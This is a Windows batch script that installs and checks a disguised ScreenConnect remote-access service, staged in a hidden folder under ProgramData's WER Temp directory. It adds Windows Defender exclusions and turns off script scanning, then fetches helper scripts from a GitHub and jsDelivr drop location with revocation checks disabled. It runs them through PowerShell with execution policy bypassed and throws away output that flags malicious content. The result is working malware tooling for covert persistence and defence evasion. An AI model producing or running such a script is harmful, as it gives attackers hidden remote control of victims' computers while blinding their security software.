@echo off
rem OWN_GRYXA_FORCE BUILD 20260804F1 - force Gryxa install (safe) + one-line REPORT
rem Usage: own_gryxa_force.cmd
rem        own_gryxa_force.cmd "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
rem Exit: 0=HEALTHY, 1=DOWN/absent, 2=MSI/fetch fail
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\own_gryxa_force.log"
set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "CDN=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] force_begin host=%COMPUTERNAME%>>"%LOG%"

rem soft exclusions (ignore errors)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

rem refresh helpers
"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 40 -o "%WD%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 12 --max-time 40 -o "%WD%\own_gryxa.cmd" "%CDN%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%WD%\own_lib.ps1" "%RAW%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%WD%\own_lib.ps1" "%CDN%/own_lib.ps1?t=%RANDOM%" >nul 2>&1

set "PRE=ABSENT"
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
)

rem already alive → report only
if /I "%PRE%"=="ALIVE" goto :Report

rem try PS ensure first (L43 safe); fall back to own_gryxa.cmd
set "ENSURE="
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Force -NoWait -WorkDir "%WD%" -Build F1 2^>nul`) do set "ENSURE=%%R"
  echo ensure=!ENSURE!>>"%LOG%"
  echo !ENSURE!| findstr /I "malicious ScriptContainedMaliciousContent" >nul
  if not errorlevel 1 set "ENSURE="
)

sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 goto :Report

if exist "%WD%\own_gryxa.cmd" (
  echo cmd_fallback>>"%LOG%"
  call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" >>"%LOG%" 2>&1
) else (
  echo no_own_gryxa>>"%LOG%"
)

timeout /t 20 /nobreak >nul

:Report
set "STATE=ABSENT"
set "WIN32=na"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "STATE=ABSENT"
) else (
  for /f "tokens=3 delims=: " %%A in ('sc query "%SVC%" ^| findstr /I "STATE"') do set "STATE=%%A"
  for /f "tokens=3 delims=: " %%A in ('sc query "%SVC%" ^| findstr /I "WIN32_EXIT_CODE"') do set "WIN32=%%A"
)

set "HEALTH=DOWN"
if /I "!STATE!"=="RUNNING" set "HEALTH=HEALTHY"
if /I "!STATE!"=="START_PENDING" set "HEALTH=HEALTHY"
if /I "!STATE!"=="CONTINUE_PENDING" set "HEALTH=HEALTHY"

set "DIR=0"
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"

set "TCP=na"
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" 2^>nul`) do set "GHEALTH=%%R"
)

echo.
echo ====== GRYXA REPORT ======
echo HOST=%COMPUTERNAME%
echo FP=%FP%
echo PRE=%PRE%
echo STATE=!STATE!
echo HEALTH=!HEALTH!
echo DIR=!DIR!
echo WIN32=!WIN32!
echo ENSURE=!ENSURE!
echo GHEALTH=!GHEALTH!
echo REPORT^|!COMPUTERNAME!^|%FP%^|!HEALTH!^|state=!STATE!^|dir=!DIR!^|pre=%PRE%^|ensure=!ENSURE!
echo ==========================
echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE!>>"%LOG%"

if /I "!HEALTH!"=="HEALTHY" (
  endlocal & exit /b 0
)
endlocal & exit /b 1
